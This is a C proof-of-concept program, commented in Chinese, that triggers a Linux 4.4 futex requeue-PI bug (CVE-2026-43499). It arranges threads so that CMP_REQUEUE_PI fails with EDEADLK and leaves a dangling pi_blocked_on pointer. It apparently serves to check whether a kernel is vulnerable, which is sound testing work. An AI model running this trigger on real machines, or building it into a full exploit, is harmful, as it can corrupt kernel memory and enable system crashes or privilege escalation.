/* ghostlock_diag.c — CVE-2026-43499 在 4.4 上的触发诊断 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

static int f_chain = 0, f_wait = 0, f_target = 0;
static atomic_int stage = 0;

static int futex(int *uaddr, int op, int val, const void *a4, int *uaddr2, int val3) {
    return syscall(SYS_futex, uaddr, op, val, a4, uaddr2, val3);
}

/* waiter: 持有 f_chain, 然后在 f_wait 上 WAIT_REQUEUE_PI 等被转到 f_target */
static void *t_waiter(void *a) {
    (void)a;
    int r = futex(&f_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[waiter ] LOCK_PI f_chain = %d (errno=%d)\n", r, errno);
    atomic_store(&stage, 1);
    while (atomic_load(&stage) < 2) sched_yield();
    r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, NULL, &f_target, 0);
    printf("[waiter ] WAIT_REQUEUE_PI 返回 %d (errno=%d %s)\n", r, errno, strerror(errno));
    printf("[waiter ] >>> 若此行出现且 requeuer 报 EDEADLK: 本线程带着悬空 pi_blocked_on 回到了用户态 <<<\n");
    return NULL;
}

/* owner: 持有 f_target, 再去抢 waiter 持有的 f_chain → 阻塞在 waiter 身后 */
static void *t_owner(void *a) {
    (void)a;
    while (atomic_load(&stage) < 1) sched_yield();
    int r = futex(&f_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[owner  ] LOCK_PI f_target = %d (errno=%d)\n", r, errno);
    atomic_store(&stage, 2);
    while (atomic_load(&stage) < 3) sched_yield();
    r = futex(&f_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[owner  ] LOCK_PI f_chain = %d (errno=%d)\n", r, errno);
    return NULL;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    pthread_t tw, to;
    pthread_create(&tw, NULL, t_waiter, NULL);
    pthread_create(&to, NULL, t_owner, NULL);
    while (atomic_load(&stage) < 2) sched_yield();
    usleep(200000);                       /* 等 waiter 睡进 f_wait */
    atomic_store(&stage, 3);
    usleep(200000);                       /* 等 owner 阻塞在 f_chain */
    int r = futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_target, 0);
    printf("[requeuer] CMP_REQUEUE_PI = %d (errno=%d %s)\n", r, errno, strerror(errno));
    printf("           期望值: -1 / EDEADLK —— 出现即证明回滚路径已触发\n");
    sleep(2);
    printf("[*] 诊断结束\n");
    return 0;
}